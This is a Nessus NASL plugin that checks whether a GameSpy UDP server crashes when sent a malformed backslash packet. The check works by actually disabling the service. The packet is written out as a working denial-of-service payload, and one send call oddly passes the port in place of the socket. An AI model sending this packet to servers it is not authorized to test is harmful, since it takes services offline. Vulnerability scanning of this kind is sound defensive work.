#
# (C) Tenable Network Security
#

if(description)
{
 script_id(12081);
 script_bugtraq_id(9741);
 script_version ("$Revision: 1.1 $");
 
 name["english"] = "GameSpy Denial";

 script_name(english:name["english"]);

    desc["english"] = "
The remote GameSpy server could be disabled by sending a malformed packet.

An attacker could exploit this flaw to prevent this host from being a game
server.

Nessus actually disabled this service.
 
Solution : Filter incoming traffic to this port, or disable this service
Risk factor : Low";


 script_description(english:desc["english"]);
 

 summary["english"] = "Disables the remote GameSpy Server";
 
 script_summary(english:summary["english"]);

 script_category(ACT_DENIAL);

 script_copyright(english:"This script is Copyright (C) 2004 Tenable Network Security");

 family["english"] = "Denial of Service";
 script_family(english:family["english"]);
 script_dependencies("gamespy_detect.nasl");
 script_require_keys("Services/udp/gamespy");
 exit(0);
}

port = get_kb_item("Services/udp/gamespy");
if ( ! port ) exit(0);
else port = int(port);

soc = open_sock_udp(port);
send(socket:soc, data:string("\\players\\rules\\status\\packets\\"));
r = recv(socket:soc, length:4096, timeout:2);
close(soc);
if(strlen(r) > 0)
{
 soc = open_sock_udp(port);
 send(socket:port, data:"\\");
 r = recv(socket:soc, length:4096, timeout:2);
 close(soc);
 if ( ! strlen(r) )
 {
  soc = open_sock_udp(port);
  send(socket:soc, data:string("\\players\\rules\\status\\packets\\"));
  r = recv(socket:soc, length:4096, timeout:2);
  close(soc);
  if ( ! strlen(r) ) security_warning(port);
 }
}
